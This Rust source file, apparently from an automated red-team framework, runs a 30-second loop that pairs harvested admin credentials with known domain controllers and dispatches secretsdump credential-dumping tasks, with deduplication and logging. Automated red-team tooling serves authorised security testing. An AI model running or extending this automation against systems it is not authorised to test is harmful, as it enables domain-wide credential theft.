//! auto_local_admin_secretsdump -- secretsdump with admin creds.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Dispatches secretsdump when admin credentials are detected.
/// Interval: 30s. Matches Python `_auto_local_admin_secretsdump`.
pub async fn auto_local_admin_secretsdump(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Collect admin creds + target DCs
        let work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            let admin_creds: Vec<_> = state
                .credentials
                .iter()
                .filter(|c| c.is_admin && !c.domain.is_empty())
                .cloned()
                .collect();

            let mut items = Vec::new();
            for cred in &admin_creds {
                for dc_ip in state.domain_controllers.values() {
                    let dedup = format!(
                        "{}:{}:{}",
                        dc_ip,
                        cred.username.to_lowercase(),
                        cred.domain.to_lowercase()
                    );
                    if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                        items.push((dedup, dc_ip.clone(), cred.clone()));
                    }
                }
            }
            items
        };

        for (dedup_key, dc_ip, cred) in work.into_iter().take(3) {
            match dispatcher.request_secretsdump(&dc_ip, &cred, 3).await {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, user = %cred.username, "Admin secretsdump dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch secretsdump"),
            }
        }
    }
}
